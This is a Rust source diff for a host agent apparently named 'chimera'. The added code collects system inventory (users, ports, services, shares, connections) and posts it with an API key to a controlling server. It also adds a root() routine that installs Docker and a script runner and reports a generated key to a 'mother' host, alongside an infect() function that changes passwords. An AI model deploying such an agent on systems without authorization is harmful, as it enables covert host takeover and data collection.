@@ -1,4 +1,16 @@
 use crate::client::types::{Disk, Host, Infect, User, UserInfo, OS};
+use anyhow::Result;
+use rand::{thread_rng, Rng};
+use reqwest::{
+    blocking::Client,
+    header::{HeaderMap, HeaderValue},
+};
+use std::fs::{create_dir_all, OpenOptions};
+use std::fs;
+use std::io::Write;
+use std::path::Path;
+use std::thread::sleep;
+use std::time::{Duration, Instant};
 use sysinfo::{CpuExt, DiskExt, System, SystemExt, UserExt};
 
 impl Host {
@@ -12,15 +24,18 @@ impl Host {
         Host {
             hostname: sys_info::hostname().unwrap_or_default().into(),
             ip: Host::ip(),
-            // max_addr:
+            version: sys.os_version().unwrap_or_default().into(),
+            // mac_addr:
+            // nameserver
             os: std::env::consts::OS.into(),
             cpu: sys.cpus().first().unwrap().brand().into(),
-            memory: sys.total_memory(),
+            cores: sys_info::cpu_num().unwrap_or_default() as u8,
+            memory: sys.total_memory() / 1024 / 1024,
             // disk: storage / 1024 / 1024 / 1024,
             disks: disks(&sys),
             network_adapters: String::from(""),
             ports: open_ports,
-            connections: connections,
+            connections,
             services: Host::services(),
             users: users(&sys),
             shares: Host::shares(),
@@ -30,8 +45,114 @@ impl Host {
         }
     }
 
+    // Function to wait for the server to be ready
+    fn wait_for_server_ready(server_url: &str, timeout: Duration) -> bool {
+        let client = Client::new();
+        let start_time = Instant::now();
+
+        while start_time.elapsed() < timeout {
+            match client.get(server_url).send() {
+                Ok(response) if response.status().is_success() => {
+                    println!("Server is ready.");
+                    return true;
+                }
+                _ => {
+                    sleep(Duration::from_secs(1));
+                }
+            }
+        }
+
+        println!("Timeout waiting for server to be ready.");
+        false
+    }
+
+    pub async fn inventory(&self, ip: &str, api_key: &str) -> Result<()> {
+        let log_path = "/opt/chimera/run.log";
+        let log_dir = Path::new("/opt/chimera");
+
+        if !log_dir.exists() {
+            fs::create_dir_all(log_dir)?;
+        }
+
+        // Delete the existing log file if it exists, then create a new one
+        let _ = fs::remove_file(log_path); // Ignore the result, it's fine if the file doesn't exist
+        let mut log_file = OpenOptions::new()
+            .create(true)
+            .write(true)
+            .append(true)
+            .open(log_path)?;
+
+        let inventory = self.to_json();
+        let url = format!("http://{}:3000/api/v1/inventory", ip);
+
+        if Self::wait_for_server_ready(&format!("http://{}:3000", ip), Duration::from_secs(30)) {
+            let mut headers = HeaderMap::new();
+            headers.insert("x-api-key", api_key.parse()?);
+            headers.insert("content-type", "application/json".parse()?);
+
+            let client = reqwest::Client::builder()
+                .redirect(reqwest::redirect::Policy::none())
+                .build()?;
+
+            // Log the request details
+            writeln!(log_file, "Sending POST request to {}", url)?;
+
+            let response = client
+                .post(&url)
+                .headers(headers)
+                .body(inventory)
+                .send()
+                .await?;
+
+            // Log the response
+            writeln!(
+                log_file,
+                "Received response: Status = {}, Body = {:?}",
+                response.status(),
+                response.text().await?
+            )?;
+
+            Ok(())
+        } else {
+            writeln!(log_file, "Server not ready for {}", ip)?;
+            Err(anyhow::Error::msg("Server not ready"))
+        }
+    }
+
     pub fn infect(&self, magic: u8, scheme: &str) {
         self.change_password(magic, scheme);
+    }
+
+    pub fn root(&self, mother_ip: &str, port: u16, lifetime: u8) -> anyhow::Result<()> {
+        // Decompress and write SERIAL file from bytes using flate2
+
+        let _ = super::utils::install_docker();
+
+        // Generate random 32 long hex string for api key
+        let mut rng = rand::thread_rng();
+        let api_key = (0..32)
+            .map(|_| format!("{:02x}", rng.gen::<u8>()))
+            .collect::<String>();
+
+        let _ = super::utils::install_serial_scripter(&api_key, lifetime);
+
+        // Do a check to insure the containeers are all started and running
+
+        // Send api key to server
+        let url = format!("http://{}:{}/root", mother_ip, port);
+        // Set up HTTP client and headers
+        let mut headers = reqwest::header::HeaderMap::new();
+        headers.insert("x-api-key", api_key.parse()?);
+
+        let client = reqwest::blocking::Client::builder()
+            .redirect(reqwest::redirect::Policy::none())
+            .build()?;
+
+        // Send request to server
+        let _res = client.post(&url).headers(headers).send()?.text()?; // Run Serial Scripter
+                                                                       // Send api key to server
+
+        Ok(())
     }
 
     pub fn to_json(&self) -> String {
